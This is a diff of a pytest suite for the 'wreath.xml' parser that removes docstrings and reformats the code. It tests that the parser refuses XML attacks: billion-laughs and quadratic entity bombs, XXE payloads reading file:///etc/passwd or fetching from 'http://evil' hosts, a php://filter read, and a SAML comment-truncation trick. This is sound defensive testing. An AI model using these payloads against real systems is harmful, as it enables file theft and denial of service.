@@ -1,25 +1,10 @@
-"""The refusal profile of ``wreath.xml``, written as the exploit corpus.
-
-Every test here is an attack that a lenient XML parser accepts and a signature
-layer then has to defend against separately. This parser refuses them at the
-door, so the defence is the profile rather than a check somebody remembers to
-write.
-
-Each refusal asserts its **distinct message text**, not merely that something
-was raised: every refusal message names the offending construct, so asserting
-only "XMLRefusal" would pass on whichever branch happened to fire, including a
-fallthrough.
-"""
-
 from __future__ import annotations
 
 import pytest
 
 from wreath.xml import Limits, XMLRefusal, parse
 
-# --------------------------------------------------------------------------
 # Entity expansion
-# --------------------------------------------------------------------------
 
 BILLION_LAUGHS = b"""<?xml version="1.0"?>
 <!DOCTYPE lolz [
@@ -32,14 +17,12 @@ BILLION_LAUGHS = b"""<?xml version="1.0"?>
 
 QUADRATIC_BLOWUP = (
     b'<?xml version="1.0"?>\n'
-    b"<!DOCTYPE bomb [<!ENTITY a \"" + b"A" * 1000 + b"\">]>\n"
+    b'<!DOCTYPE bomb [<!ENTITY a "' + b"A" * 1000 + b'">]>\n'
     b"<bomb>" + b"&a;" * 1000 + b"</bomb>"
 )
 
 RECURSIVE_ENTITY = (
-    b'<?xml version="1.0"?>\n'
-    b'<!DOCTYPE r [<!ENTITY x "&y;"><!ENTITY y "&x;">]>\n'
-    b"<r>&x;</r>"
+    b'<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY x "&y;"><!ENTITY y "&x;">]>\n<r>&x;</r>'
 )
 
 
@@ -49,7 +32,6 @@ RECURSIVE_ENTITY = (
     ids=["billion-laughs", "quadratic-blowup", "recursive-entity"],
 )
 def test_entity_expansion_refused_at_the_doctype(payload: bytes) -> None:
-    """No entity bomb reaches an expander, because no DTD is ever read."""
     with pytest.raises(XMLRefusal) as caught:
         parse(payload)
     assert "document type declaration" in str(caught.value)
@@ -69,20 +51,16 @@ def test_the_five_predefined_entities_are_the_whole_vocabulary() -> None:
     assert doc.root.text == "<>&\"'"
 
 
-# --------------------------------------------------------------------------
 # XXE
-# --------------------------------------------------------------------------
 
 XXE_CASES = {
     "system-file": b'<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>',
     "system-http": b'<!DOCTYPE r [<!ENTITY e SYSTEM "http://evil/x">]><r>&e;</r>',
     "public-id": b'<!DOCTYPE r PUBLIC "-//X//EN" "http://evil/x.dtd"><r/>',
     "external-subset": b'<!DOCTYPE r SYSTEM "http://evil/x.dtd"><r/>',
-    "parameter-entity": (
-        b'<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/e.dtd"> %p;]><r/>'
-    ),
+    "parameter-entity": (b'<!DOCTYPE r [<!ENTITY % p SYSTEM "http://evil/e.dtd"> %p;]><r/>'),
     "php-filter": (
-        b'<!DOCTYPE r [<!ENTITY e SYSTEM '
+        b"<!DOCTYPE r [<!ENTITY e SYSTEM "
         b'"php://filter/convert.base64-encode/resource=index.php">]><r>&e;</r>'
     ),
 }
@@ -90,7 +68,6 @@ XXE_CASES = {
 
 @pytest.mark.parametrize("payload", list(XXE_CASES.values()), ids=list(XXE_CASES))
 def test_xxe_cannot_be_expressed(payload: bytes) -> None:
-    """Every XXE vector needs a DOCTYPE, and a DOCTYPE is refused."""
     with pytest.raises(XMLRefusal) as caught:
         parse(payload)
     assert caught.value.reason == "doctype"
@@ -98,20 +75,13 @@ def test_xxe_cannot_be_expressed(payload: bytes) -> None:
 
 
 def test_no_network_or_filesystem_access_is_reachable() -> None:
-    """The refusal happens before any resolver could be consulted.
-
-    The offset proves it: parsing stopped at the ``<!DOCTYPE`` token, so no
-    later construct -- including the entity reference in the body -- was read.
-    """
     payload = b'<!DOCTYPE r [<!ENTITY e SYSTEM "file:///etc/passwd">]><r>&e;</r>'
     with pytest.raises(XMLRefusal) as caught:
         parse(payload)
     assert caught.value.offset == 0
 
 
-# --------------------------------------------------------------------------
 # Processing instructions, comments, CDATA
-# --------------------------------------------------------------------------
 
 
 def test_processing_instruction_is_refused() -> None:
@@ -133,13 +103,6 @@ def test_xml_declaration_is_only_allowed_at_offset_zero() -> None:
 
 
 def test_comment_is_refused_because_it_splits_a_text_node() -> None:
-    """The SAML comment-truncation class, removed by construction.
-
-    ``<NameID>admin@corp.example<!---->.attacker.example</NameID>`` reads as one
-    value to a parser that concatenates text around a comment and as another to
-    one that stops at the first text node. Refusing comments means the two
-    readings cannot differ, because the document does not parse at all.
-    """
     payload = b"<NameID>admin@corp.example<!---->.attacker.example</NameID>"
     with pytest.raises(XMLRefusal) as caught:
         parse(payload)
@@ -161,9 +124,7 @@ def test_cdata_splitting_cannot_hide_markup() -> None:
     assert caught.value.reason == "cdata"
 
 
-# --------------------------------------------------------------------------
 # Encoding
-# --------------------------------------------------------------------------
 
 
 def test_declared_encoding_other_than_utf8_is_refused() -> None:
@@ -187,12 +148,6 @@ def test_utf8_is_declarable_in_either_case() -> None:
 
 
 def test_byte_order_mark_is_refused() -> None:
-    """A BOM is outside the profile, so it is refused rather than stripped.
-
-    Tolerating it would mean the bytes a signature covers and the bytes the
-    parser read could differ by three, which is precisely the ambiguity this
-    parser exists to remove.
-    """
     with pytest.raises(XMLRefusal) as caught:
         parse(b"\xef\xbb\xbf<r/>")
     assert "byte order mark" in str(caught.value)
@@ -255,9 +210,7 @@ def test_valid_numeric_character_references_decode() -> None:
     assert doc.root.text == "AB\U0001f600"
 
 
-# --------------------------------------------------------------------------
 # Structure and bounds
-# --------------------------------------------------------------------------
 
 
 def test_unclosed_tag_is_refused() -> None:
@@ -333,7 +286,6 @@ def test_duplicate_attribute_on_one_element_is_refused() -> None:
 
 
 def test_duplicate_attribute_through_different_prefixes_is_refused() -> None:
-    """Two prefixes bound to one URI spell the same expanded attribute name."""
     payload = b'<r xmlns:p="urn:x" xmlns:q="urn:x" p:a="1" q:a="2"/>'
     with pytest.raises(XMLRefusal) as caught:
         parse(payload)
@@ -358,9 +310,7 @@ def test_a_lone_gt_in_text_is_accepted_but_lt_is_not() -> None:
         parse(b"<r>a < b</r>")
 
 
-# --------------------------------------------------------------------------
 # Namespaces
-# --------------------------------------------------------------------------
 
 
 def test_undeclared_prefix_is_refused() -> None:
@@ -394,7 +344,6 @@ def test_the_xml_prefix_is_predeclared() -> None:
 
 
 def test_empty_uri_for_a_prefix_is_refused() -> None:
-    """Undeclaring a prefix is XML 1.1 only, and this parser is XML 1.0."""
     with pytest.raises(XMLRefusal) as caught:
         parse(b'<r xmlns:p=""><p:c/></r>')
     assert caught.value.reason == "empty-prefix-uri"
